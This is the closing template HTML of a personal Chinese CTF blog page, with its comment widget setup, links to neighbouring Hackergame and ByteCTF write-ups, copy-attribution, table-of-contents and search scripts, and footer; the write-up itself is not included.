<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2022-10-30T22-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/10/30/CTF_2022Hackergame_0x02/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="CTF | 2022 USTC Hackergame WriteUp 0x02">
                        
                        <span class="card-title">CTF | 2022 USTC Hackergame WriteUp 0x02</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            这是2022 Hackergame的wp第二部分，主要包括一些难度稍大的题目，以binary类型为主。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/09/30/CTF_2022ByteCTF/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="CTF | 2022 ByteCTF WriteUp">
                        
                        <span class="card-title">CTF | 2022 ByteCTF WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            上周末打了下ByteCTF，题目还是挺不错的，可是喵喵太菜，这里只能来写点简单题的writeup了。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">419.1k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
